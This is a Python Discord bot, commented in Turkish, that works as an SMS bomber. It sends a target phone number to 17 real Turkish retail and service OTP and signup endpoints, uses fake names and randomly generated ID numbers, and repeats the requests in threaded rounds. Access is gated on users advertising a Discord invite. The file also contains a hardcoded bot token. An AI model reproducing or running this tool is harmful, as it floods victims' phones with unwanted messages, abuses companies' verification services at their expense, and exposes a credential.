import discord
from discord.ext import commands
import requests
from random import choice, randint
from string import ascii_lowercase
import threading
import time
import asyncio

# Zorunlu olması gereken durum (status) linki
ZORUNLU_DURUM = "https://discord.gg/CtruP6XBw"

# --- TÜM API'LERİN YER ALDIĞI SENDSMS SINIFI ---
class SendSms:
    def __init__(self, phone, mail=""):
        # Rastgele TC No Üretici
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (
                rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] +
                      rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)

        self.tc = tcNo
        self.phone = str(phone).replace(" ", "").replace("+90", "").replace("05", "5")
        self.adet = 0

        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    # --- API METODLARI (17 Adet) ---

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
                       "Origin": "https://www.kahvedunyasi.com"}
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json().get("processStatus") == "Success":
                self.adet += 1
        except:
            pass

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/",
                                data={"confirm": "true", "email": self.mail, "phone": f"0{self.phone}",
                                      "first_name": "Memati", "last_name": "Bas", "password": "Password123!"},
                                timeout=6)
            if wmf.status_code == 202:
                self.adet += 1
        except:
            pass

    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone},
                                timeout=6)
            if bim.status_code == 200:
                self.adet += 1
        except:
            pass

    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
                              json={"Phone": self.phone, "XID": ""}, timeout=6)
            if r.json().get("isError") == False:
                self.adet += 1
        except:
            pass

    def Suiste(self):
        try:
            data = {"action": "register", "gsm": self.phone, "full_name": "Memati Bas", "password": "Password123!"}
            r = requests.post("https://suiste.com:443/api/auth/code", data=data, timeout=6)
            if r.json().get("code") == "common.success":
                self.adet += 1
        except:
            pass

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
                              json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/",
                              data={"phone": f"0{self.phone}", "email": self.mail, "confirm": "true"}, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com:443/api/users/register",
                              json={"phoneNumber": f"+90{self.phone}", "name": "Memati"}, timeout=6)
            self.adet += 1
        except:
            pass

    def TiklaGelsin(self):
        try:
            json_data = {"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{self.phone}"},
                         "query": "mutation GENERATE_OTP($phone: String) { generateOtp(phone: $phone) }"}
            r = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json_data, timeout=6)
            if r.json()["data"]["generateOtp"]:
                self.adet += 1
        except:
            pass

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                              json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com:443/users/register/",
                              data={"phone": f"0{self.phone}", "first_name": "Memati", "confirm": "true"}, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp",
                              data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            if r.json().get("is_success"):
                self.adet += 1
        except:
            pass

    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP",
                              json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend",
                              json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            if r.json().get("status") == "success":
                self.adet += 1
        except:
            pass

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send",
                              json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            if r.json().get("responseType") == "SUCCESS":
                self.adet += 1
        except:
            pass

    def Akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", json={"phone": self.phone}, timeout=6)
            if "succesfully" in r.json().get("result", ""):
                self.adet += 1
        except:
            pass

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder",
                              json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            if r.json().get("Success"):
                self.adet += 1
        except:
            pass

    def start_bombing(self, tur):
        servisler = [
            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
            self.Hizliecza, self.Metro, self.File, self.Akasya, self.Komagene
        ]

        for i in range(tur):
            threads = []
            for servis in servisler:
                t = threading.Thread(target=servis)
                threads.append(t)
                t.start()
                time.sleep(0.1)  # Rate limit koruması

            for t in threads:
                t.join()


# --- KULLANICI DURUM KONTROLÜ ---
def durum_kontrol(user: discord.Member) -> bool:
    for activity in user.activities:
        if isinstance(activity, discord.CustomActivity):
            if activity.name and ZORUNLU_DURUM in activity.name:
                return True
    return False


# --- AÇILIR FORM (MODAL) SINIFI ---
class SmsModal(discord.ui.Modal):
    def __init__(self, mod_adi: str):
        super().__init__(title=f"{mod_adi} Gönder")
        self.mod_adi = mod_adi

    phone_input = discord.ui.TextInput(
        label="Telefon Numarası (10 hane)",
        placeholder="Örnek: 5438423082",
        min_length=10,
        max_length=11,
        required=True
    )

    tur_input = discord.ui.TextInput(
        label="Tur Sayısı (1 - 10, her turda tüm servisler)",
        placeholder="Örnek: 3",
        min_length=1,
        max_length=2,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        if not durum_kontrol(interaction.user):
            await interaction.response.send_message(
                f"❌ Bu aracı kullanabilmek için profil durumuna **{ZORUNLU_DURUM}** yazman gerekiyor!", 
                ephemeral=True
            )
            return

        phone = self.phone_input.value
        try:
            tur = int(self.tur_input.value)
        except ValueError:
            await interaction.response.send_message("❌ Tur sayısı geçerli bir sayı olmalıdır!", ephemeral=True)
            return

        await interaction.response.send_message(f"⏳ `{phone}` numarası için [{self.mod_adi}] başlatıldı, bekleniyor...", ephemeral=True)

        def arka_plan_islem():
            bomber = SendSms(phone)
            bomber.start_bombing(tur)
            return bomber.adet

        adet = await asyncio.to_thread(arka_plan_islem)
        await interaction.followup.send(f"✅ Başarıyla gönderildi! Toplam başarılı istek: {adet}", ephemeral=True)


# --- DİSCORD BUTON ARAYÜZÜ ---
class IslemPaneliView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Normal SMS", style=discord.ButtonStyle.secondary, custom_id="btn_normal")
    async def normal_sms_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not durum_kontrol(interaction.user):
            await interaction.response.send_message(
                f"❌ Durumuna **{ZORUNLU_DURUM}** eklemeden bu butonu kullanamazsın!", 
                ephemeral=True
            )
            return
        await interaction.response.send_modal(SmsModal("Normal SMS"))

    @discord.ui.button(label="Turbo SMS", style=discord.ButtonStyle.secondary, custom_id="btn_turbo")
    async def turbo_sms_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not durum_kontrol(interaction.user):
            await interaction.response.send_message(
                f"❌ Durumuna **{ZORUNLU_DURUM}** eklemeden bu butonu kullanamazsın!", 
                ephemeral=True
            )
            return
        await interaction.response.send_modal(SmsModal("Turbo SMS"))


# --- BOT VE KOMUTLAR ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True        
intents.presences = True      

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot aktif: {bot.user.name}")

@bot.command(name="sms")
async def sms_komutu(ctx):
    if not durum_kontrol(ctx.author):
        await ctx.send(
            f"❌ **{ctx.author.mention}**, bu paneli açabilmek için profil durumuna **{ZORUNLU_DURUM}** yazmalısın!",
            delete_after=10
        )
        return

    embed = discord.Embed(
        title="Aşağıdan İşlemini Seç.",
        description=(
            f"• **Toplam 17 API Vardır.**\n\n"
            f"*Durumunuza `{ZORUNLU_DURUM}` Yazmanız Gerekli*"
        ),
        color=discord.Color.dark_gray()
    )
    await ctx.send(embed=embed, view=IslemPaneliView())

# Bot Token'ı
bot.run("MTU2NTM0MDk4MDg1MTM3NjI5MA.Ga7Vcz.Ku_GM9lkyWng5ZIn1hFR6keG8W1INXHKthz4r0")
                                      
